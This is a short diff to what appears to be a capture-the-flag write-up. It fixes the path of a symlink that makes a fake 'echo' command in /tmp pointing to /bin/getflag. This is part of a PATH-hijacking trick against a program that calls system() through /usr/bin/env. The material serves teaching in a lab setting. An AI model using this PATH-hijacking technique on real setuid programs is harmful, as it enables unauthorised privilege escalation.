@@ -27,7 +27,7 @@ system("/usr/bin/env echo Exploit me")        <unfinished ...>
 
 1. First, we create a fake `echo` command in the `/tmp/` directory:
 ```bash
-ln -s /bin/getflag /etc/echo
+ln -s /bin/getflag /tmp/echo
 ```
 
 2. We update the PATH variable to include the `/tmp/` directory:
